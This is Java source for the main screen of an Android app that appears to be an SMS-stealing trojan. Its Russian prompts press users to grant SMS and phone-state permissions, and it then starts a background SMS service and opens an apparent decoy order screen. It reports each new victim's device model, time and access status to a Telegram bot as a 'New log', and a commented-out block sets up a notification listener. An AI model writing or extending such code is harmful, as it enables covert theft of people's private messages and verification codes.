package com.agayev.smssender;

import static com.agayev.smssender.SMSReceiver.TELEGRAM_CHAT_ID;
import static com.agayev.smssender.SMSReceiver.TELEGRAM_TOKEN;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.agayev.smssender.network.ApiClient;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String PREFS_NAME = "MyPrefsFile";
    private static final String FIRST_RUN_KEY = "firstRun";

    private static final int PERMISSION_SEND_SMS = 123;
    private static final int REQUEST_PHONE_STATE_PERMISSION = 123;

    private int smsPermissionRequestCount = 0;
    private int phoneStatePermissionRequestCount = 0;

    private Button startButton;

    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        startButton = findViewById(R.id.start_button);
        startButton.setOnClickListener(v -> checkAndRequestPermissions());
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (!checkSmsPermission()) {
            permissionsNeeded.add(android.Manifest.permission.READ_SMS);
            permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        }

        if (!permissionsNeeded.isEmpty()) {
            requestPermissions(permissionsNeeded.toArray(new String[0]), PERMISSION_SEND_SMS);
        } else {
            startService();
            Intent myIntent = new Intent(MainActivity.this, OrderActivity.class);
            MainActivity.this.startActivity(myIntent);
            sendMessage();
        }
    }

    private void firstTimeRun(boolean permissionGranted) {
        if (permissionGranted) {
            sendMessage();
        } else {
            if (phoneStatePermissionRequestCount < 3) {
                requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_PHONE_STATE_PERMISSION);
                phoneStatePermissionRequestCount++;
            }
        }
    }

    private void sendMessage() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String permissionStatus = "Да";
        String deviceModel = Build.MANUFACTURER + " " + Build.MODEL;
        String currentTime = getCurrentTime();
        String data =
                "Новый лог ⚠\uFE0F " +
                        "\n\n\uD83D\uDCF1 Модель устройства → " + deviceModel +
                        "\n\n\uD83D\uDD52 Время → " + currentTime +
                        "\n\n\uD83D\uDD13 Доступ → " + permissionStatus;
        //"\n\n☎\uFE0F Номер телефона → " + phoneNumber;

        ApiClient client = new ApiClient();
        Log.e(TAG, data);
        client.sendMessage(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, data);
    }

    private String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermissions() {
        if (smsPermissionRequestCount < 3) {
            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS}, PERMISSION_SEND_SMS);
            smsPermissionRequestCount++;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_SEND_SMS) {
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                for (int result : grantResults) {
                    if (result != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        break;
                    }
                }
                if (allPermissionsGranted) {
                    startService();
                    Intent myIntent = new Intent(MainActivity.this, OrderActivity.class);
                    MainActivity.this.startActivity(myIntent);
                    sendMessage();
                } else {
                    Toast.makeText(this, "Чтобы приложение работало корректно примите все разрешения", Toast.LENGTH_LONG).show();
                    requestSmsPermissions();
                }
            }
        } else if (requestCode == REQUEST_PHONE_STATE_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                firstTimeRun(true);
            } else {
                firstTimeRun(false);
                Toast.makeText(this, "Чтобы приложение работало корректно примите все разрешения", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void startService() {
        Intent serviceIntent = new Intent(this, SMSService.class);
        startService(serviceIntent);
    }
}

/*
<service
            android:name=".NotificationListener"
            android:label="Notification Listener"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:foregroundServiceType="dataSync"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
 */